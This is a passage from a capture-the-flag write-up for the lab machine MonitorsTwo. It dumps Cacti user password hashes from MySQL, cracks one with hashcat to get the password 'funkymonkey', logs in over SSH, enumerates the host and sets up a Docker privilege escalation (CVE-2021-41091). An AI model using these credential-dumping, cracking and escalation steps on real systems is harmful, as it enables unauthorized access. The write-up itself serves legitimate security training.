</span><span class="z-text z-plain">| data_source_stats_daily             |
</span><span class="z-text z-plain">| data_source_stats_hourly            |
</span><span class="z-text z-plain">| data_source_stats_hourly_cache      |
</span><span class="z-text z-plain">| data_source_stats_hourly_last       |
</span><span class="z-text z-plain">| data_source_stats_monthly           |
</span><span class="z-text z-plain">| data_source_stats_weekly            |
</span><span class="z-text z-plain">| data_source_stats_yearly            |
</span><span class="z-text z-plain">| data_template                       |
</span><span class="z-text z-plain">| data_template_data                  |
</span><span class="z-text z-plain">| data_template_rrd                   |
</span><span class="z-text z-plain">| external_links                      |
</span><span class="z-text z-plain">| graph_local                         |
</span><span class="z-text z-plain">| graph_template_input                |
</span><span class="z-text z-plain">| graph_template_input_defs           |
</span><span class="z-text z-plain">| graph_templates                     |
</span><span class="z-text z-plain">| graph_templates_gprint              |
</span><span class="z-text z-plain">| graph_templates_graph               |
</span><span class="z-text z-plain">| graph_templates_item                |
</span><span class="z-text z-plain">| graph_tree                          |
</span><span class="z-text z-plain">| graph_tree_items                    |
</span><span class="z-text z-plain">| host                                |
</span><span class="z-text z-plain">| host_graph                          |
</span><span class="z-text z-plain">| host_snmp_cache                     |
</span><span class="z-text z-plain">| host_snmp_query                     |
</span><span class="z-text z-plain">| host_template                       |
</span><span class="z-text z-plain">| host_template_graph                 |
</span><span class="z-text z-plain">| host_template_snmp_query            |
</span><span class="z-text z-plain">| plugin_config                       |
</span><span class="z-text z-plain">| plugin_db_changes                   |
</span><span class="z-text z-plain">| plugin_hooks                        |
</span><span class="z-text z-plain">| plugin_realms                       |
</span><span class="z-text z-plain">| poller                              |
</span><span class="z-text z-plain">| poller_command                      |
</span><span class="z-text z-plain">| poller_data_template_field_mappings |
</span><span class="z-text z-plain">| poller_item                         |
</span><span class="z-text z-plain">| poller_output                       |
</span><span class="z-text z-plain">| poller_output_boost                 |
</span><span class="z-text z-plain">| poller_output_boost_local_data_ids  |
</span><span class="z-text z-plain">| poller_output_boost_processes       |
</span><span class="z-text z-plain">| poller_output_realtime              |
</span><span class="z-text z-plain">| poller_reindex                      |
</span><span class="z-text z-plain">| poller_resource_cache               |
</span><span class="z-text z-plain">| poller_time                         |
</span><span class="z-text z-plain">| processes                           |
</span><span class="z-text z-plain">| reports                             |
</span><span class="z-text z-plain">| reports_items                       |
</span><span class="z-text z-plain">| sessions                            |
</span><span class="z-text z-plain">| settings                            |
</span><span class="z-text z-plain">| settings_tree                       |
</span><span class="z-text z-plain">| settings_user                       |
</span><span class="z-text z-plain">| settings_user_group                 |
</span><span class="z-text z-plain">| sites                               |
</span><span class="z-text z-plain">| snmp_query                          |
</span><span class="z-text z-plain">| snmp_query_graph                    |
</span><span class="z-text z-plain">| snmp_query_graph_rrd                |
</span><span class="z-text z-plain">| snmp_query_graph_rrd_sv             |
</span><span class="z-text z-plain">| snmp_query_graph_sv                 |
</span><span class="z-text z-plain">| snmpagent_cache                     |
</span><span class="z-text z-plain">| snmpagent_cache_notifications       |
</span><span class="z-text z-plain">| snmpagent_cache_textual_conventions |
</span><span class="z-text z-plain">| snmpagent_managers                  |
</span><span class="z-text z-plain">| snmpagent_managers_notifications    |
</span><span class="z-text z-plain">| snmpagent_mibs                      |
</span><span class="z-text z-plain">| snmpagent_notifications_log         |
</span><span class="z-text z-plain">| user_auth                           |
</span><span class="z-text z-plain">| user_auth_cache                     |
</span><span class="z-text z-plain">| user_auth_group                     |
</span><span class="z-text z-plain">| user_auth_group_members             |
</span><span class="z-text z-plain">| user_auth_group_perms               |
</span><span class="z-text z-plain">| user_auth_group_realm               |
</span><span class="z-text z-plain">| user_auth_perms                     |
</span><span class="z-text z-plain">| user_auth_realm                     |
</span><span class="z-text z-plain">| user_domains                        |
</span><span class="z-text z-plain">| user_domains_ldap                   |
</span><span class="z-text z-plain">| user_log                            |
</span><span class="z-text z-plain">| vdef                                |
</span><span class="z-text z-plain">| vdef_items                          |
</span><span class="z-text z-plain">| version                             |
</span><span class="z-text z-plain">+-------------------------------------+
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>There's lots of tables, but <code>user_auth</code> looks particularly noteworthy.</p>
<h4 id="user-auth-s-columns"><code>user_auth</code>'s columns</h4>
<p>Let's continue our enumeration of this database by checking the content of the
<code>user_auth</code> table.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">MySQL</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-keyword z-control z-regexp z-set z-begin z-shell">[</span>(none)<span class="z-keyword z-control z-regexp z-set z-end z-shell">]</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SELECT column_type, column_name FROM information_schema.columns WHERE table_name = <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>user_auth<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">+-----------------------+------------------------+
</span><span class="z-text z-plain">| column_type           | column_name            |
</span><span class="z-text z-plain">+-----------------------+------------------------+
</span><span class="z-text z-plain">| mediumint(8) unsigned | id                     |
</span><span class="z-text z-plain">| varchar(50)           | username               |
</span><span class="z-text z-plain">| varchar(256)          | password               |
</span><span class="z-text z-plain">| mediumint(8)          | realm                  |
</span><span class="z-text z-plain">| varchar(100)          | full_name              |
</span><span class="z-text z-plain">| varchar(128)          | email_address          |
</span><span class="z-text z-plain">| char(2)               | must_change_password   |
</span><span class="z-text z-plain">| char(2)               | password_change        |
</span><span class="z-text z-plain">| char(2)               | show_tree              |
</span><span class="z-text z-plain">| char(2)               | show_list              |
</span><span class="z-text z-plain">| char(2)               | show_preview           |
</span><span class="z-text z-plain">| char(2)               | graph_settings         |
</span><span class="z-text z-plain">| tinyint(3) unsigned   | login_opts             |
</span><span class="z-text z-plain">| tinyint(3) unsigned   | policy_graphs          |
</span><span class="z-text z-plain">| tinyint(3) unsigned   | policy_trees           |
</span><span class="z-text z-plain">| tinyint(3) unsigned   | policy_hosts           |
</span><span class="z-text z-plain">| tinyint(3) unsigned   | policy_graph_templates |
</span><span class="z-text z-plain">| char(2)               | enabled                |
</span><span class="z-text z-plain">| int(11)               | lastchange             |
</span><span class="z-text z-plain">| int(11)               | lastlogin              |
</span><span class="z-text z-plain">| varchar(4096)         | password_history       |
</span><span class="z-text z-plain">| varchar(3)            | locked                 |
</span><span class="z-text z-plain">| int(5)                | failed_attempts        |
</span><span class="z-text z-plain">| int(10) unsigned      | lastfail               |
</span><span class="z-text z-plain">| int(10) unsigned      | reset_perms            |
</span><span class="z-text z-plain">+-----------------------+------------------------+
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>Okay, so this table contains 25 columns.</p>
<h4 id="user-auth-s-columns-content"><code>user_auth</code>'s columns content</h4>
<p>Let's retrieve the content of the <code>username</code> and <code>password</code> columns.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">MySQL</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-keyword z-control z-regexp z-set z-begin z-shell">[</span>(none)<span class="z-keyword z-control z-regexp z-set z-end z-shell">]</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SELECT username, password FROM user_auth</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">+----------+--------------------------------------------------------------+
</span><span class="z-text z-plain">| username | password                                                     |
</span><span class="z-text z-plain">+----------+--------------------------------------------------------------+
</span><span class="z-text z-plain">| admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
</span><span class="z-text z-plain">| guest    | 43e9a4ab75570f5b                                             |
</span><span class="z-text z-plain">| marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
</span><span class="z-text z-plain">+----------+--------------------------------------------------------------+
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>We find two hashes: one for <code>admin</code> and one for <code>marcus</code>.</p>
<p>I'll place them on my machine in <code>/workspaces/mysql.hash</code>.</p>
<h4 id="hash-cracking">Hash cracking</h4>
<p>Let's try to crack these hashes using <code>hashcat</code> with the <code>rockyou.txt</code> wordlist.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> hashcat<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>3200<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/mysql.hash<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/share/wordlists/rockyou.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p><code>marcus</code>' hash corresponds to the <code>funkymonkey</code> password!</p>
<h1 id="host-10-10-11-211-1">Host <code>10.10.11.211</code></h1>
<h2 id="foothold-ssh">Foothold (SSH)</h2>
<p>Let's try the credentials <code>marcus</code>:<code>funkymonkey</code> to connect to MonitorsTwo over
SSH.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>marcus@10.10.11.211<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">The authenticity of host &#39;10.10.11.211 (10.10.11.211)&#39; can&#39;t be established.
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">marcus@10.10.11.211&#39;s password:
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">marcus@monitorstwo:~$
</span></code></pre>
<p>Nice!</p>
<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
<p>If we run <code>whoami</code>, we see that we got a foothold as <code>marcus</code> (obviously).</p>
<h3 id="architecture">Architecture</h3>
<p>What is MonitorsTwo's architecture?</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">marcus@monitorstwo:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">x86_64
</span></code></pre>
<p>It's using x86_64. Let's keep that in mind to select the appropriate binaries.</p>
<h3 id="distribution">Distribution</h3>
<p>Let's see which distribution MonitorsTwo is using.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">marcus@monitorstwo:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/lsb-release<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">DISTRIB_ID=Ubuntu
</span><span class="z-text z-plain">DISTRIB_RELEASE=20.04
</span><span class="z-text z-plain">DISTRIB_CODENAME=focal
</span><span class="z-text z-plain">DISTRIB_DESCRIPTION=&quot;Ubuntu 20.04.6 LTS&quot;
</span></code></pre>
<p>Okay, so it's Ubuntu 20.04.</p>
<h3 id="kernel">Kernel</h3>
<p>Let's find the kernel version of MonitorsTwo.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">marcus@monitorstwo:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">5.4.0-147-generic
</span></code></pre>
<p>It's <code>5.4.0</code>.</p>
<h3 id="users">Users</h3>
<p>Let's enumerate all users.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">marcus@monitorstwo:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> grep <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.*sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/passwd<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">marcus
</span><span class="z-text z-plain">root
</span></code></pre>
<p>There's <code>marcus</code> (us) and <code>root</code>.</p>
<h3 id="groups">Groups</h3>
<p>Let's enumerate all groups.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">marcus@monitorstwo:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/group<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">adm
</span><span class="z-text z-plain">audio
</span><span class="z-text z-plain">backup
</span><span class="z-text z-plain">bin
</span><span class="z-text z-plain">cdrom
</span><span class="z-text z-plain">crontab
</span><span class="z-text z-plain">daemon
</span><span class="z-text z-plain">dialout
</span><span class="z-text z-plain">dip
</span><span class="z-text z-plain">disk
</span><span class="z-text z-plain">docker
</span><span class="z-text z-plain">fax
</span><span class="z-text z-plain">floppy
</span><span class="z-text z-plain">fwupd-refresh
</span><span class="z-text z-plain">games
</span><span class="z-text z-plain">gnats
</span><span class="z-text z-plain">input
</span><span class="z-text z-plain">irc
</span><span class="z-text z-plain">kmem
</span><span class="z-text z-plain">kvm
</span><span class="z-text z-plain">landscape
</span><span class="z-text z-plain">_laurel
</span><span class="z-text z-plain">list
</span><span class="z-text z-plain">lp
</span><span class="z-text z-plain">lxd
</span><span class="z-text z-plain">mail
</span><span class="z-text z-plain">man
</span><span class="z-text z-plain">marcus
</span><span class="z-text z-plain">messagebus
</span><span class="z-text z-plain">netdev
</span><span class="z-text z-plain">news
</span><span class="z-text z-plain">nogroup
</span><span class="z-text z-plain">operator
</span><span class="z-text z-plain">plugdev
</span><span class="z-text z-plain">proxy
</span><span class="z-text z-plain">render
</span><span class="z-text z-plain">root
</span><span class="z-text z-plain">sasl
</span><span class="z-text z-plain">shadow
</span><span class="z-text z-plain">src
</span><span class="z-text z-plain">ssh
</span><span class="z-text z-plain">staff
</span><span class="z-text z-plain">sudo
</span><span class="z-text z-plain">sys
</span><span class="z-text z-plain">syslog
</span><span class="z-text z-plain">systemd-coredump
</span><span class="z-text z-plain">systemd-journal
</span><span class="z-text z-plain">systemd-network
</span><span class="z-text z-plain">systemd-resolve
</span><span class="z-text z-plain">systemd-timesync
</span><span class="z-text z-plain">tape
</span><span class="z-text z-plain">tcpdump
</span><span class="z-text z-plain">tss
</span><span class="z-text z-plain">tty
</span><span class="z-text z-plain">users
</span><span class="z-text z-plain">utmp
</span><span class="z-text z-plain">uucp
</span><span class="z-text z-plain">uuidd
</span><span class="z-text z-plain">video
</span><span class="z-text z-plain">voice
</span><span class="z-text z-plain">www-data
</span></code></pre>
<p>The <code>docker</code> and <code>lxd</code> groups are interesting to elevate privileges.</p>
<h3 id="nics">NICs</h3>
<p>Let's gather the list of connected NICs.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">marcus@monitorstwo:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ifconfig</span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">br-60ea49c21773: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
</span><span class="z-text z-plain">        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
</span><span class="z-text z-plain">        ether 02:42:07:ae:9e:35  txqueuelen 0  (Ethernet)
</span><span class="z-text z-plain">        RX packets 0  bytes 0 (0.0 B)
</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
</span><span class="z-text z-plain">        TX packets 0  bytes 0 (0.0 B)
</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">br-7c3b7c0d00b3: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
</span><span class="z-text z-plain">        inet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255
</span><span class="z-text z-plain">        inet6 fe80::42:d9ff:fe28:c07b  prefixlen 64  scopeid 0x20&lt;link&gt;
</span><span class="z-text z-plain">        ether 02:42:d9:28:c0:7b  txqueuelen 0  (Ethernet)
</span><span class="z-text z-plain">        RX packets 1  bytes 28 (28.0 B)
</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
</span><span class="z-text z-plain">        TX packets 5  bytes 526 (526.0 B)
</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">docker0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
</span><span class="z-text z-plain">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
</span><span class="z-text z-plain">        ether 02:42:7d:ac:4e:ab  txqueuelen 0  (Ethernet)
</span><span class="z-text z-plain">        RX packets 0  bytes 0 (0.0 B)
</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
</span><span class="z-text z-plain">        TX packets 0  bytes 0 (0.0 B)
</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
</span><span class="z-text z-plain">        inet 10.10.11.211  netmask 255.255.254.0  broadcast 10.10.11.255
</span><span class="z-text z-plain">        inet6 fe80::250:56ff:feb9:a04  prefixlen 64  scopeid 0x20&lt;link&gt;
</span><span class="z-text z-plain">        inet6 dead:beef::250:56ff:feb9:a04  prefixlen 64  scopeid 0x0&lt;global&gt;
</span><span class="z-text z-plain">        ether 00:50:56:b9:0a:04  txqueuelen 1000  (Ethernet)
</span><span class="z-text z-plain">        RX packets 118  bytes 13616 (13.6 KB)
</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
</span><span class="z-text z-plain">        TX packets 175  bytes 24024 (24.0 KB)
</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
</span><span class="z-text z-plain">        inet 127.0.0.1  netmask 255.0.0.0
</span><span class="z-text z-plain">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
</span><span class="z-text z-plain">        loop  txqueuelen 1000  (Local Loopback)
</span><span class="z-text z-plain">        RX packets 316  bytes 24538 (24.5 KB)
</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
</span><span class="z-text z-plain">        TX packets 316  bytes 24538 (24.5 KB)
</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">veth03ef420: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
</span><span class="z-text z-plain">        inet6 fe80::747b:2fff:fe56:121a  prefixlen 64  scopeid 0x20&lt;link&gt;
</span><span class="z-text z-plain">        ether 76:7b:2f:56:12:1a  txqueuelen 0  (Ethernet)
</span><span class="z-text z-plain">        RX packets 17  bytes 1340 (1.3 KB)
</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
</span><span class="z-text z-plain">        TX packets 26  bytes 4731 (4.7 KB)
</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">vethb5a9a23: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
</span><span class="z-text z-plain">        inet6 fe80::48:4aff:fe7f:e748  prefixlen 64  scopeid 0x20&lt;link&gt;
</span><span class="z-text z-plain">        ether 02:48:4a:7f:e7:48  txqueuelen 0  (Ethernet)
</span><span class="z-text z-plain">        RX packets 13  bytes 3645 (3.6 KB)
</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
</span><span class="z-text z-plain">        TX packets 33  bytes 2732 (2.7 KB)
</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span></code></pre>
<p>There are physical Ethernet interfaces, virtual Ethernet interfaces, the
loopback interface and a few bridges (including one for Docker).</p>
<h3 id="hostname">Hostname</h3>
<p>What is MonitorsTwo's hostname?</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">marcus@monitorstwo:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">monitorstwo
</span></code></pre>
<p>Yeah I know, very surprising.</p>
<h2 id="system-enumeration-2">System enumeration</h2>
<h3 id="flags">Flags</h3>
<p>If we check our home folder, we find the user flag.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">marcus@monitorstwo:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/marcus/user.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">786ab09d9b40f20fbcc53552e2b9de82
</span></code></pre>
<h3 id="inspecting-var-spool-mail-marcus">Inspecting <code>/var/spool/mail/marcus</code></h3>
<p>If we check our mailbox, we find one message.</p>
<pre class="z-code"><code><span class="z-text z-plain">From: administrator@monitorstwo.htb
</span><span class="z-text z-plain">To: all@monitorstwo.htb
</span><span class="z-text z-plain">Subject: Security Bulletin - Three Vulnerabilities to be Aware Of
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">Dear all,
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">Best regards,
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">Administrator
</span><span class="z-text z-plain">CISO
</span><span class="z-text z-plain">Monitor Two
</span><span class="z-text z-plain">Security Team
</span></code></pre>
<p>An administrator warns us that three vulnerabilites were recently discovered and
might affect our system.</p>
<p>The <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41091">CVE-2021-41091</a> looks
particularly promising to me.</p>
<h2 id="privilege-escalation-cve-2021-41091">Privilege escalation (<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41091">CVE-2021-41091</a>)</h2>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41091">CVE-2021-41091</a> is a
vulnerability affecting Moby versions prior to <code>20.10.9</code>. Due to insufficiently
restricted permissions, a local user has access to the content of the Docker
data directory, typically located at <code>/var/lib/docker</code>, as if he exists on the
container. Therefore, he's able to read, write and execute any files on a Docker
container if the permissions in this container allow it. Moreover, if a binary
in this container has the SUID bit set, the user can execute it with the owner's
privileges from the system, resulting in a privilege escalation vulnerability.</p>
<h3 id="checks">Checks</h3>
<p>Let's check if our version of Docker has been updated, as suggested by the
